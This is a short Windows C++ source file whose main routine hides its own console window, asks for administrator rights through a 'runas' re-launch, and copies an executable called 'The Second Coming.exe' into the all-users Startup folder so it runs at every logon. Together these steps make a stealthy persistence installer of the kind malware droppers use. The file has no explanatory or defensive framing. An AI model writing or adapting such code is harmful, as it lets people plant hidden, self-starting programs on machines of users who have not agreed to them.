#include <windows.h>
#include <Windows.h>
#include <winternl.h>
#include <unistd.h>
#include <tchar.h>
#include <cstring>
#include <iostream>

char src[260] = {NULL};
char des[260] = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\The Second Coming.exe";

void HideWindow() {
	HWND hwnd = GetForegroundWindow();
	if (hwnd) {
		ShowWindow(hwnd, SW_HIDE);
	}
}

bool IsProcessRunAsAdmin() {
	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	PSID AdministratorsGroup;
	BOOL b = AllocateAndInitializeSid(
	             &NtAuthority,
	             2,
	             SECURITY_BUILTIN_DOMAIN_RID,
	             DOMAIN_ALIAS_RID_ADMINS,
	             0, 0, 0, 0, 0, 0,
	             &AdministratorsGroup);
	if (b) {
		CheckTokenMembership(NULL, AdministratorsGroup, &b);
		FreeSid(AdministratorsGroup);
	}
	return b == TRUE;
}

short GetAdmin(LPCSTR Param, int Showcmd) {
	if (IsProcessRunAsAdmin())
		return 0;
	TCHAR Path[MAX_PATH];
	ZeroMemory(Path, MAX_PATH);
	::GetModuleFileName(NULL, Path, MAX_PATH);
	HINSTANCE res;
	res = ShellExecute(NULL, "runas", Path, Param, NULL, Showcmd);
	if ((int *)res > (int *)32)
		return 1;
	else
		return 0;
}

int main() {
	HideWindow();
	GetAdmin(NULL, SW_SHOW);
	getcwd(src, 260);
	strcat(src, "\\The Second Coming.exe");
	std::cout << src << " " << des;
	bool flat = CopyFile(_T(src), _T(des), true);
}